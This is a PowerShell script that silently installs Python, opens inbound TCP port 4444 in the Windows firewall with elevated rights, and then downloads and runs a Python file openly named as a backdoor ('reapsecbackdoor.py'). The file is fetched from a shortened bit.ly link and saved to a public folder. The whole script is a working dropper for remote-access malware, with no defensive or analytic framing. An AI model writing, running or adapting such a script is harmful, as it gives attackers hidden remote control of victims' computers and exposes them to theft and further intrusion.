function Install-Python {
    Write-Host "Installing Python..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
    Start-Process "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
}

function Configure-Firewall {
    Write-Host "Configuring firewall..."
    Start-Process "netsh" -ArgumentList "advfirewall firewall add rule name=Open Port 4444 dir=in action=allow protocol=TCP localport=4444" -Wait -Verb RunAs
}

function Download-And-Run-Backdoor {
    Write-Host "Downloading backdoor script..."
    Invoke-WebRequest -Uri "https://bit.ly/3AhVHLp" -OutFile "C:\Users\Public\reapsecbackdoor.py"

    Write-Host "Running backdoor script..."
    Start-Process "python" -ArgumentList "C:\Users\Public\reapsecbackdoor.py"
}

# Check if Python is installed
$pythonInstalled = Get-Command python -ErrorAction SilentlyContinue

if (-not $pythonInstalled) {
    Install-Python
}

Configure-Firewall
Download-And-Run-Backdoor
